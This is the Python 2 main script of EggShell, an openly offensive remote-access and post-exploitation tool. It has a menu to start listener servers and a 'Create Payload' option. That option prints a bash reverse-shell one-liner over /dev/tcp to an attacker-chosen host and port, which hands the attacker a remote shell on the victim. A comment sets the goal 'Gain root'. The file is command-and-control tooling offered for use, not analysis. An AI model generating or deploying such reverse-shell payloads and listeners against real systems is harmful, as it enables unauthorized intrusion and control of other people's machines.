#!/usr/bin/python
#EggShell
#Created By lucas.py 8-18-16
#TODO: Gain root, and fix for any system() call locally
debug = 0

import base64
import binascii
import os
import random
import string
import sys
import time
from StringIO import StringIO
from threading import Thread
sys.dont_write_bytecode = True
from modules.encryption.ESEncryptor import ESEncryptor
from modules.server.server import ESServer
from modules.helper.helper import Helper
#MARK: Globals
h = Helper()
shellKey = ''.join((random.choice(string.letters+string.digits)) for x in range(32))
server = ESServer(ESEncryptor(shellKey,16),h)

BANNER_ART_TEXT = h.GREEN+"""
.---.          .-. .        . .       \\      `.
|             (   )|        | |     o  \\       `.
|--- .-.. .-.. `-. |--. .-. | |         \\        `.
|   (   |(   |(   )|  |(.-' | |     o    \\      .`
'---'`-`| `-`| `-' '  `-`--'`-`-          \\   .`
     ._.' ._.'                               `          """+h.RED+"""
 _._._._._._._._._._|"""+h.COLOR_INFO+"______________________________________________."+h.RED+"""
|_#_#_#_#_#_#_#_#_#_|"""+h.COLOR_INFO+"_____________________________________________/"+h.RED+"""
                    l
"""+h.WHITE+"\nVersion: 2.2.2\nCreated By Lucas Jackson (@neoneggplant)\n"+h.ENDC
BANNER_MENU_TEXT = h.WHITE+"-"*40+"\n"+""" Menu:
    1): Start Server
    2): Start Multi Server
    3): Create Payload
    4): Exit
"""+h.WHITE+"-"*40
BANNER = BANNER_ART_TEXT+""+BANNER_MENU_TEXT+"\n"+h.NES
ONMENU = 1
def menu():
    global ONMENU
    while 1:
        ONMENU = 1
        os.system(h.CMD_CLEAR)
        option = raw_input(BANNER)
        choose = {
            "1" : menuStartServer,
            "2" : menuStartMultiServer,
            "3" : menuCreateScript,
            "4" : menuExit
        }
        try:
            ONMENU = 0
            choose[option]()
            os.system(h.CMD_CLEAR)
        except KeyError:
            ONMENU = 1
            continue

def promptHostPort():
    lhost = server.getip()
    lport = None
    hostChoice = raw_input("SET LHOST (Leave blank for "+lhost+")>")
    if hostChoice != "":
        lhost = hostChoice
    h.strinfo("LHOST = " + lhost)
    #validate int
    while 1:
        try:
            lport = raw_input("SET LPORT (Leave blank for 4444)>")
            if not lport:
                lport = 4444
            lport = int(lport)
            if lport < 1024:
                h.strinfo("invalid port, please enter a value >= 1024")
                continue
            break
        except KeyboardInterrupt:
            return
        except:
            h.strinfo("invalid port, please enter a valid integer")

    h.strinfo("LPORT = " + str(lport))
    return [lhost,lport]

def promptServerRun(host,port):
    if raw_input(h.NES+"Start Server? (Y/n): ") == "n":
        return
    else:
        if raw_input(h.NES+"Multi Server? (y/N): ") == "y":
            server.multiServer(host,port)
        else:
            server.singleServer(host,port)

#MARK: Menu Functions

def menuStartServer(): #1
    sp = promptHostPort()
    if not sp:
        return
    server.singleServer(sp[0],sp[1])

def menuStartMultiServer(): #2
    sp = promptHostPort()
    server.multiServer(sp[0],sp[1]);
    menu()

def menuCreateScript(): #3
    sp = promptHostPort()
    print h.COLOR_INFO+"bash &> /dev/tcp/"+sp[0]+"/"+str(sp[1])+" 0>&1"+h.ENDC
    promptServerRun(sp[0],sp[1])

def menuExit(): #4
    exit()

def main():
    global ONMENU
    while 1:
        try:
            menu()
        except KeyboardInterrupt:
            if ONMENU == 1:
                print ""
                exit()

main()
